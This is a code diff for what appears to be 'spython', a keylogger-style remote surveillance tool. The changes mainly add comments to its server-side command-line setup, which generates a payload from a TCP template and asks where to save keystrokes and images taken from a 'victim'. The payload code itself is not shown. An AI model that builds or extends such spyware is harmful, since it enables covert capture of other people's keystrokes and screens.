@@ -124,7 +124,7 @@ class Server:
            
 
 def main()->None:
-   
+   #Private variables that shoud not be changed
     __TEMPLATE_PATH = "templates/spython_tcp_template.py"
     __PAYLOAD_FILE_NAME =  "payload.py"
     __SIG_HOST = "SPYTHON_HOST"
@@ -146,7 +146,9 @@ def main()->None:
         except ValueError :
             sys.stderr.write(f"Port number must be of base 10 and between 1000 and {2**16}\n")
         flag = input("Automatically generate paylaod?[y/n](default=y): ") or "y"
-       
+        
+        #If true, generate source code for payload.
+        #NOTE TO SELF: Added compiling feature
         if flag.lower() == "y":
            TEMP = ""
            with open(__TEMPLATE_PATH,"r") as f:
@@ -165,15 +167,13 @@ def main()->None:
                      TEMP=""
                             
            break
-                 
-        
         elif flag.lower() == "n":
              break
-        
+        #asks user for all input again if input is incorrect
         else:
              continue
            
-
+    #Path of file to store retrieved data from victim
     KPATH = input("Path of file to save keystrokes: ") or "logs.txt"
     IPATH = input("Path of file to save image: ") or "image.jpeg"
     
@@ -227,6 +227,8 @@ if __name__ == "__main__":
                                                           
 """
    msg = "This is the command line interface of spython. Fill in the parametes below to start the sever!"
+   
+   #Checks user OS to initialise CLI
    if os.name == "posix":
       print(logo[:141],colored(logo[141:],"red"))
       print(colored(msg,"red"))
